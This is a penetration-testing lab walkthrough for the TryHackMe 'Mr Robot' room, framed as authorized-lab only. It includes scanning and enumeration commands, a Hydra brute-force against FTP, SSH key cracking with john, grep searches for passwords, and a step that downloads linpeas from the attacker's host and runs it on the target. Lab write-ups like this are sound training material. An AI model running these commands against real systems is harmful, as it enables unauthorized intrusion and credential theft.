---
title: "Mr Robot (TryHackMe) — Authorized Lab Walkthrough"
kind: lab
tags: ["tryhackme", "mr-robot", "enumeration", "privilege-escalation"]
---

> WARNING: This walkthrough is for **authorized lab environments only** (TryHackMe / HackTheBox). Do not use these steps against systems you don't own or have explicit permission to test.

# Overview
This is a structured, step-by-step approach to a Mr Robot style room: reconnaissance, enumeration, foothold, and privilege escalation. Replace IPs and paths with the lab target values.

## 1) Recon & Discovery
- Ping (optional): `ping -c 3 <TARGET>`
- Nmap service discovery (save XML):
```bash
nmap -Pn -sC -sV -oX findings.xml <TARGET>
# faster mass-scan using rustscan
rustscan -a <TARGET> -- -sC -sV
```
Save `findings.xml` for parsing.

## 2) Web Enumeration
- Directory brute force:
```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt -x .php,.txt
```
- Vhost discovery:
```bash
gobuster vhost -u "http://<IP>" --domain <DOMAIN> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

## 3) Service Access & Initial Foothold
- If FTP allows anonymous or discovered creds, use `ftp` or `curl` to download/upload files.
- Example: use Hydra for online password guessing (confirm service and form):
```bash
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://<TARGET>:21
```
- If you obtain a private key, set permissions and SSH:
```bash
chmod 600 id_rsa
ssh -i id_rsa user@<TARGET>
```
- Convert SSH key for john:
```bash
python3 /opt/john/ssh2john.py id_rsa > id_rsa_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
```

## 4) Post-Footprint Enumeration & Privilege Escalation
- Basic local enumeration:
```bash
id; whoami; uname -a; cat /etc/os-release
ls -la /home
sudo -l
```
- SUID search:
```bash
find / -type f -perm -04000 2>/dev/null
```
- Check for cron jobs, world writable files, and credentials:
```bash
crontab -l 2>/dev/null || ls /etc/cron* -la
find / -writable -type f 2>/dev/null
grep -R "password" /var/log /etc 2>/dev/null
```
- Use linpeas (lab-only) for quick local checks:
```bash
# on your machine:
python3 -m http.server 8000
# on target:
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## 5) Reporting
- Save timeline, commands, outputs, and screenshots.
- Use `nmap -oX` + `scripts/nmap_xml_to_md.py` to generate a Markdown table of findings:
```bash
python3 scripts/nmap_xml_to_md.py findings.xml > nmap_findings.md
```

